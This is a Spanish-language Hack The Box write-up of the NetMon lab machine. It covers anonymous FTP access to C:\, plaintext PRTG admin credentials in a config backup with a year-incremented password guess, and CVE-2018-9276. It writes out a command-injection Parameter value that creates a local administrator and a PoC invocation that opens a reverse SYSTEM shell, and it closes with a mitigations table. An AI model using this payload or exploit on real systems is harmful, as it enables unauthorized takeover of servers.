---
title: "HTB Walkthrough: NetMon"
date: 2026-06-13
draft: false
description: "Walkthrough completo de la máquina NetMon de Hack The Box. Dificultad Easy, OS Windows Server 2016. FTP anónimo con acceso al sistema de archivos, credenciales en backup de configuración PRTG y escalada a SYSTEM mediante CVE-2018-9276."
tags: ["HackTheBox", "Windows", "Easy", "FTP", "PRTG", "CVE-2018-9276", "CommandInjection", "PrivEsc", "netmon", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Resolución de **NetMon** en Hack The Box. Máquina de dificultad **Easy** con sistema operativo **Windows Server 2016**. El FTP anónimo expone el sistema de archivos raíz de Windows, lo que nos permite leer un backup de configuración de PRTG con credenciales en texto claro. Con acceso al panel de administración explotamos CVE-2018-9276, una inyección de comandos en el sistema de notificaciones de PRTG que ejecuta código como **NT AUTHORITY\SYSTEM**.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

<div style="text-align:center;margin:1.5rem 0 0.5rem;">
  <img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/3fa8184483e279369b81becafbac9dee.png"
       alt="NetMon icon"
       style="width:80px;height:80px;border-radius:50%;border:2px solid rgba(159,238,0,0.4);box-shadow:0 0 16px rgba(159,238,0,0.2);">
</div>

## 🗺️ Información de la Máquina
| Campo          | Detalle                                                              |
|----------------|----------------------------------------------------------------------|
| **Nombre**     | NetMon                                                               |
| **OS**         | Windows Server 2016                                                  |
| **Dificultad** | Easy                                                                 |
| **IP**         | 10.129.14.77                                                         |
| **Técnicas**   | FTP Anonymous Read · Credential Exposure · CVE-2018-9276 · Command Injection |
---
## 1. Reconocimiento
### 1.1 Escaneo de Puertos
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.14.77
```
```
PORT      STATE SERVICE
21/tcp    open  ftp
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
47001/tcp open  winrm
```
Escaneo de versiones sobre los puertos relevantes:
```bash
nmap -sC -sV -p21,80,5985 10.129.14.77
```
```
PORT     STATE SERVICE  VERSION
21/tcp   open  ftp      Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http     Indy httpd (Paessler PRTG bandwidth monitor)
|_http-title: Welcome | PRTG Network Monitor
5985/tcp open  http     Microsoft HTTPAPI httpd (WSMAN)
```
*Puertos abiertos:*
- `21` → FTP con **acceso anónimo habilitado**
- `80` → **PRTG Network Monitor** — herramienta de monitorización de infraestructura
- `5985` → WinRM (útil si obtenemos credenciales de administrador)
> **💡 Dato clave:** PRTG Network Monitor es software con historial de vulnerabilidades críticas. El FTP anónimo en un servidor Windows puede exponer rutas sensibles del sistema de archivos si no está correctamente aislado en un directorio chroot.
### 1.2 Enumeración FTP — Acceso al Sistema de Archivos
```bash
ftp 10.129.14.77
# Usuario: anonymous / Sin contraseña
```
```
ftp> ls
02-03-19  12:18AM         .rnd
02-25-19  10:15PM  <DIR>  inetpub
07-16-16  09:18AM  <DIR>  PerfLogs
02-25-19  10:56PM  <DIR>  Program Files
02-03-19  12:28AM  <DIR>  Program Files (x86)
02-03-19  08:08AM  <DIR>  Users
11-10-23  10:20AM  <DIR>  Windows
```
El FTP expone el **sistema de archivos raíz de Windows** (`C:\`). Podemos navegar libremente por directorios del sistema sin autenticación — una misconfiguration crítica que convierte el FTP en un vector de lectura de cualquier archivo accesible al proceso.
La documentación oficial de PRTG indica que los archivos de configuración se almacenan en `C:\ProgramData\Paessler\PRTG Network Monitor`:
```bash
ftp> cd ProgramData/Paessler/PRTG\ Network\ Monitor
ftp> ls
```
```
06-13-26  08:17AM  <DIR>   Configuration Auto-Backups
02-25-19  10:54PM  1189697 PRTG Configuration.dat
02-25-19  10:54PM  1189697 PRTG Configuration.old
07-14-18  03:13AM  1153755 PRTG Configuration.old.bak
06-13-26  09:41AM  1722335 PRTG Graph Data Cache.dat
```
Hay tres archivos de configuración: el actual (`.dat`), una copia anterior (`.old`) y un backup antiguo (`.old.bak`). Los backups suelen contener información histórica valiosa — credenciales que ya no están en producción pero que revelan patrones. Descargamos el más antiguo:
```bash
ftp> get PRTG\ Configuration.old.bak
```
> **💡 Conclusiones:** Acceso de lectura a todo `C:\` sin autenticación. El backup de configuración de PRTG es el objetivo prioritario — los archivos de configuración de software de monitorización frecuentemente contienen credenciales de administrador en texto claro.
---
## 2. Explotación — Credenciales en Backup y CVE-2018-9276
### 2.1 Extracción de Credenciales del Backup
```bash
grep -A2 "dbpassword" "PRTG Configuration.old.bak"
```
```xml
<dbpassword>
  <!-- User: prtgadmin -->
  PrTg@dmin2018
```
Credenciales encontradas: `prtgadmin:PrTg@dmin2018`. Sin embargo, este backup es de **julio de 2018** y las credenciales actuales del sistema son del año siguiente. PRTG tiene una política de rotación anual, y un patrón tan predecible como incrementar el año hace que la "rotación" sea trivialmente bypasseable:
```
PrTg@dmin2018 → Login fallido
PrTg@dmin2019 → ✅ Login exitoso
```
Con `prtgadmin:PrTg@dmin2019` accedemos al panel de administración en `http://10.129.14.77/`.

![Página de login de PRTG Network Monitor](/img/netmon1.png)

![Dashboard de PRTG tras el login exitoso como administrador](/img/netmon2.png)

La versión instalada es **PRTG 18.1.37.13946**, vulnerable al **CVE-2018-9276**.
### 2.2 Análisis de la Vulnerabilidad — CVE-2018-9276
PRTG permite configurar notificaciones que ejecutan scripts externos cuando se disparan ciertos eventos. El campo **"Parameter"** de la sección "Execute Program" no sanitiza el input del usuario antes de pasarlo al proceso de ejecución. Usando `;` podemos encadenar comandos adicionales que PRTG ejecutará como **NT AUTHORITY\SYSTEM**.
```
Flujo normal:    Parameter: "archivo.txt" → script recibe el argumento → ejecuta acción legítima
Flujo malicioso: Parameter: "archivo.txt;comando" → script recibe argumento
                 → PRTG pasa el resto al shell sin sanitizar → comando ejecutado como SYSTEM
```
### 2.3 Explotación Manual — Crear Usuario Administrador
Navegamos a **Setup → Account Settings → Notifications → Add new notification**:

![Menú Setup → Notifications en PRTG](/img/netmon3.png)

En la sección **"Execute Program"** configuramos:
- **Program File:** `Demo exe notification - outfile.ps1`
- **Parameter:** `test.txt;net user attacker P@ssw0rd! /add;net localgroup administrators attacker /add`

![Configuración de la notificación maliciosa en PRTG con el comando inyectado en el campo Parameter](/img/netmon4.png)

El payload encadena tres acciones:
1. `test.txt` — argumento esperado por el script para que no falle.
2. `net user attacker P@ssw0rd! /add` — crea un usuario local.
3. `net localgroup administrators attacker /add` — lo añade al grupo de administradores.
Guardamos la notificación y la disparamos desde la lista usando el **icono de campana** ("Send test notification"):

![Lista de notificaciones con el icono Send test notification resaltado](/img/netmon5.png)

PRTG ejecuta el script como SYSTEM y los comandos se procesan.
### 2.4 Shell de SYSTEM con Exploit Automatizado
Exploit disponible en: [CVE-2018-9276 PoC](https://github.com/BardLaudian/CVE_2018_9276)
```bash
python cve_2018_9276.py \
  -i 10.129.14.77 \
  -p 80 \
  --lhost 10.10.14.211 \
  --lport 4444 \
  --user prtgadmin \
  --password PrTg@dmin2019
```
```
C:\Windows\system32> whoami
nt authority\system
```
✅ **Shell de SYSTEM obtenida.**
---
## 3. User Flag
La flag de usuario está en el escritorio público, accesible directamente desde el FTP sin necesidad de shell:
```bash
ftp> get Users/Public/Desktop/user.txt
```
> 🔑 Flag de usuario obtenida.
---
## 4. Root Flag
Con la shell de SYSTEM navegamos al escritorio del Administrador:
```bash
C:\Users\Administrator\Desktop> type root.txt
```
> **Nota:** En Windows, el equivalente de `cat` es `type`. No existe de forma nativa en `cmd.exe`.
> 🏁 Flag de root obtenida.
---
## 5. Resumen y Lecciones Aprendidas
**Ruta de compromiso:**
1. **Recon** → FTP anónimo expone `C:\` completo; puerto 80 sirve PRTG Network Monitor.
2. **Enumeración FTP** → `C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.old.bak` contiene credenciales en texto claro.
3. **Credenciales** → `prtgadmin:PrTg@dmin2018` del backup; actualización de año → `PrTg@dmin2019` → login exitoso.
4. **CVE-2018-9276** → Command injection en campo Parameter de notificaciones PRTG → comandos ejecutados como SYSTEM.
5. **Flags** → User flag via FTP directo; root flag con shell de SYSTEM → `root.txt`.
**Lo que aprendí con esta máquina:**
- **FTP anónimo sin chroot en Windows es acceso de lectura a `C:\`.** No hace falta explotar nada — navegar por el FTP equivale a navegar por el explorador de archivos del servidor. Cualquier archivo legible por el proceso FTP está a nuestra disposición, incluidos directorios de aplicaciones con configuración sensible.
- **Los backups de configuración de software de infraestructura son un objetivo prioritario.** PRTG, Nagios, Zabbix y herramientas similares frecuentemente almacenan credenciales de administrador en sus archivos de configuración para conectarse a los servicios que monitorizan. Si el backup está disponible, suele contener versiones históricas de esas credenciales.
- **La rotación de contraseñas con patrón predecible no es seguridad.** Cambiar `PrTg@dmin2018` a `PrTg@dmin2019` cumple formalmente con una política de rotación anual, pero cualquier atacante que conozca la contraseña del año anterior puede deducir la actual en segundos. Una rotación efectiva requiere contraseñas aleatorias sin relación entre sí.
- **CVE-2018-9276 ilustra el riesgo de las herramientas de administración con capacidad de ejecución de scripts.** PRTG necesita ejecutar scripts para sus notificaciones — es una funcionalidad legítima. El problema es no sanitizar el input antes de pasarlo al proceso. Software de monitorización e infraestructura suele correr con privilegios elevados, lo que convierte cualquier inyección de comandos en acceso inmediato a SYSTEM.
- **Siempre verificar todos los archivos de la misma familia antes de usar las credenciales encontradas.** Había tres versiones del archivo de configuración (`.dat`, `.old`, `.old.bak`). El `.dat` actual podría haber tenido credenciales directamente válidas. El `.old.bak` era el más antiguo y requirió el ajuste del año — haber empezado por el `.dat` podría haber ahorrado ese paso.
**Mitigaciones:**
| Vector | Mitigación |
|--------|------------|
| FTP anónimo con acceso al raíz del sistema | Deshabilitar el acceso anónimo; si se necesita FTP, aislar en un directorio chroot sin rutas del sistema |
| Credenciales en texto claro en backups de configuración | Cifrar los backups; eliminar backups antiguos; nunca almacenar contraseñas en texto claro en XML |
| Rotación de contraseñas con patrón predecible | Usar contraseñas generadas aleatoriamente sin relación entre versiones |
| CVE-2018-9276 — Command injection en PRTG | Actualizar PRTG a versión 18.2.39 o superior donde el campo Parameter está sanitizado |
| PRTG ejecutando notificaciones como SYSTEM | Configurar PRTG para ejecutar scripts con un usuario de servicio sin privilegios administrativos |
